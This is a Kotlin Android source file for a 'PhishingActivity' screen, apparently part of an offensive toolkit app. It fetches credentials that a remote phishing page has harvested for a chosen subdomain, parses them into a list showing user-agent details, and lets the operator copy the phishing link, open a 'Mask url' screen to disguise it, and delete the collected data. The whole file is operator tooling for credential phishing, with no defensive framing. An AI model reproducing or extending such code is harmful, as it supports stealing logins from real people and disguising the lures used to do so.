package com.anubhav.codereverse.uiapp.ui.socialengineering

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.view.View
import androidx.recyclerview.widget.DividerItemDecoration
import androidx.recyclerview.widget.LinearLayoutManager
import com.anubhav.codereverse.R
import com.anubhav.codereverse.databinding.ActivityPhishingBinding
import com.anubhav.codereverse.uiapp.adapters.PhishingListAdapter
import com.anubhav.codereverse.uiapp.common.IConstants
import com.anubhav.codereverse.uiapp.common.IConstants.DELETE_PHISHING_CREDS
import com.anubhav.codereverse.uiapp.common.IConstants.GET_PHISHING_CREDS
import com.anubhav.codereverse.uiapp.database.retrofit.entity.PhishingCredentialsData
import com.anubhav.codereverse.uiapp.database.retrofit.remote.RetrofitBuilder
import com.anubhav.codereverse.uiapp.database.retrofit.remote.addCallback
import com.anubhav.codereverse.uiapp.database.retrofit.remote.parseResponse
import com.anubhav.codereverse.uiapp.ui.common.*
import com.anubhav.codereverse.uiapp.ui.home.setErrorFromWebView
import com.anubhav.codereverse.uiapp.ui.home.setTextFromWebView
import com.anubhav.codereverse.uiapp.ui.webservice.showWebViewLoadingDialog
import com.anubhav.codereverse.utils.Utils
import com.anubhav.customprogresshud.CustomProgressHUD
import org.json.JSONObject
import java.io.BufferedReader
import java.io.FileInputStream
import java.io.FileNotFoundException
import java.io.InputStreamReader
import java.net.URL
import org.apache.commons.lang3.StringUtils
import org.jsoup.Jsoup


class PhishingActivity : BaseActivity<ActivityPhishingBinding>(), PhishingListAdapter.Listener {

    private lateinit var progress: CustomProgressHUD
    private lateinit var mAdapter: PhishingListAdapter
    private val title by lazy { intent.getStringExtra("title")?: "Phishing" }

    private var serveBaseUrl: String = ""
    private val serverSubDomain by lazy { title }
    private val serverFileName = "credentials.txt"
    private val localFileName by lazy { serverSubDomain + "_" + serverFileName }

    companion object {
        fun start(context: Context, title: String) {
            val intent = Intent(context, PhishingActivity::class.java)
            intent.putExtra("title", title)
            context.startActivity(intent)
        }
    }

    override fun getViewBinding() = ActivityPhishingBinding.inflate(layoutInflater)

    override fun onCreateApp(savedInstanceState: Bundle?) {
        // show progress bar
        progress = getCustomProgress()

        binding.layActionbar.actionBarTitle = StringUtils.capitalize(title)
        binding.layActionbar.imgBack.setOnSingleClickListener { finish() }

        serveBaseUrl = preferences.domainBaseUrl()
        initRecyclerView()

        binding.btnCopyUrl.setOnSingleClickListener {
            val absoluteUrl = binding.websiteUrl.text.toString()
            val clipboard: ClipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText("Sharing link", absoluteUrl)
            clipboard.setPrimaryClip(clip)
            binding.rootView.snackbar("Sharing link copied.\nDo you want to mask this link?")
                .setAction("Mask url") { MaskingUrlActivity.start(this) }
                .show()
        }

        binding.deleteButton.setOnSingleClickListener {
            showConfirmDialog(R.string.confirm_delete_title, R.string.confirm_deleteall_desc) {
                val postData = JSONObject()
                postData.put("user_id", preferences.loggedUID())
                postData.put("sub_domain", serverSubDomain)
                if (preferences.canRequestWithWebView()) {
                    showWebViewLoadingDialog("$serveBaseUrl$DELETE_PHISHING_CREDS", postData.toString()) { dialog, json ->
                        onDeleteContentResponse(json)
                        dialog?.dismiss()
                    }
                } else {
                    progress.show()
                    RetrofitBuilder.create(this).deletePhishingCredentials(postData.toString()).addCallback { isSuccessful, response ->
                        if (isSuccessful) {
                            progress.dismiss()
                            onDeleteContentResponse(response.parseResponse())
                        }
                    }
                }
            }
        }
    }

    override fun onItemInfoClick(data: PhishingCredentialsData) {
        showConfirmDialog("User-Agent Info", data.userAgent)
    }

    override fun onItemLongClick(data: PhishingCredentialsData) {
    }

    private fun initRecyclerView() {
        mAdapter = PhishingListAdapter(this, this)

        binding.recyclerView.apply {
            adapter = mAdapter
            layoutManager = LinearLayoutManager(this@PhishingActivity, LinearLayoutManager.VERTICAL, false)
            addItemDecoration(DividerItemDecoration(this@PhishingActivity, LinearLayoutManager.VERTICAL))
        }

        val postData = JSONObject()
        postData.put("user_id", preferences.loggedUID())
        postData.put("sub_domain", serverSubDomain)
        if (preferences.canRequestWithWebView()) {
            showWebViewLoadingDialog("$serveBaseUrl$GET_PHISHING_CREDS", postData.toString()) { dialog, json ->
                onGetContentResponse(json) { dialog?.dismiss() }
            }
        } else {
            progress.show()
            RetrofitBuilder.create(this).getPhishingCredentials(postData.toString()).addCallback { isSuccessful, response ->
                if (isSuccessful) {
                    onGetContentResponse(response.parseResponse()) { progress.dismiss() }
                }
            }
        }
    }

    private fun updateRecyclerView(list: MutableList<PhishingCredentialsData>) {
        if (list.isEmpty()) {
            //list.add(getEmptyItem())
            binding.layNotFound.rootView.visibility = View.VISIBLE
            binding.deleteButton.visibility = View.GONE
        } else {
            binding.layNotFound.rootView.visibility = View.GONE
            binding.deleteButton.visibility = View.VISIBLE
            list.sortWith(Comparator { lhs, rhs ->
                val lhsTime = Utils.dateToMillis(lhs.dateTime)
                val rhsTime = Utils.dateToMillis(rhs.dateTime)
                // -1 - less than, 1 - greater than, 0 - equal, all inversed for descending
                if (lhsTime > rhsTime) -1 else if (lhs.dateTime < rhs.dateTime) 1 else 0
            })
        }
        mAdapter.submitList(list)
    }

    private fun getContentFromServer(): MutableList<PhishingCredentialsData> {
        val list: MutableList<PhishingCredentialsData> = mutableListOf()
        try {
            val fileUrl = "$serveBaseUrl$serverSubDomain/$serverFileName"
            val content = URL(fileUrl).readText()
            Utils.saveStringContent(this@PhishingActivity, localFileName, content)
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            try {
                val fin: FileInputStream = openFileInput(localFileName)
                val reader = BufferedReader(InputStreamReader(fin))
                var line: String? = null
                while (reader.readLine().also { line = it } != null) {
                    val items = line!!.split(" --> ")
                    list.add(PhishingCredentialsData(items[0], items[1], items[2], items[3], items[4]))
                }
                reader.close()
                fin.close()
            } catch (e2: FileNotFoundException) {
                e2.printStackTrace()
            }
        }
        return list
    }

    private fun onDeleteContentResponse(json: JSONObject) {
        if (json.optBoolean("status")) {
            showToast(json.optString("message", "Successfully Deleted"))
            finish()
        } else {
            showToast(json.optString("message", "Deletion failed!"))
        }
    }

    private fun onGetContentResponse(json: JSONObject, block: () -> Unit) {
        try {
            if (json.optBoolean("status")) {
                setTextFromWebView(binding.websiteUrl, json.optString("absoluteUrl", "This domain not configured yet."))

                val content = json.optString("message")
                Utils.saveStringContent(this@PhishingActivity, localFileName, content)
            } else {
                throw Exception("Response status false")
            }
        } catch (e: Exception) {
            e.printStackTrace()
            val doc = Jsoup.parse(json.optString("message", "Check internet connection or may be this domain not configured yet."))
            val text = doc.body().text()
            setErrorFromWebView(binding.websiteUrl, text)

        } finally {
            val list: MutableList<PhishingCredentialsData> = mutableListOf()
            try {
                val fin: FileInputStream = openFileInput(localFileName)
                val reader = BufferedReader(InputStreamReader(fin))
                var line: String? = null
                while (reader.readLine().also { line = it } != null) {
                    val items = line!!.split(" --> ")
                    list.add(PhishingCredentialsData(items[0], items[1], items[2], items[3], items[4]))
                }
                reader.close()
                fin.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
            runOnUiThread { updateRecyclerView(list) }
            block()
        }
    }

}